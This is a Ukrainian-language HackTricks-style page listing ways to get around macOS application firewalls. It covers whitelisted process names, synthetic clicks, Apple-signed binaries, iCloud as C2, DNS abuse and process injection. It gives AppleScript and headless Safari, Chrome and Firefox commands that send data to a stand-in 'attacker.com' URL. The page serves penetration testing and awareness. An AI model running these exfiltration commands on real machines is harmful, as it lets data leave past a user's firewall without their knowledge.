# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Знайдені техніки

Наступні техніки були виявлені як працюючі в деяких програмах брандмауера macOS.

### Зловживання іменами у білому списку

- Наприклад, викликати шкідливе ПЗ з іменами відомих процесів macOS, таких як **`launchd`**

### Синтетичний клік

- Якщо брандмауер запитує дозвіл у користувача, змусьте шкідливе ПЗ **натиснути на дозволити**

### **Використовуйте підписані Apple двійкові файли**

- Як **`curl`**, але також інші, такі як **`whois`**

### Відомі домени Apple

Брандмауер може дозволяти з'єднання з відомими доменами Apple, такими як **`apple.com`** або **`icloud.com`**. І iCloud може бути використаний як C2.

### Загальний обхід

Деякі ідеї для спроби обійти брандмауери

### Перевірка дозволеного трафіку

Знання дозволеного трафіку допоможе вам виявити потенційно включені в білий список домени або які програми мають доступ до них.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Зловживання DNS

DNS-резолюції виконуються через **`mdnsreponder`** підписаний додаток, який, ймовірно, буде дозволено контактувати з DNS-серверами.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Через браузерні додатки

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Через ін'єкції процесів

Якщо ви можете **ін'єктувати код у процес**, який має право підключатися до будь-якого сервера, ви можете обійти захист брандмауера:

{{#ref}}
macos-proces-abuse/
{{#endref}}

## Посилання

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{{#include ../../banners/hacktricks-training.md}}
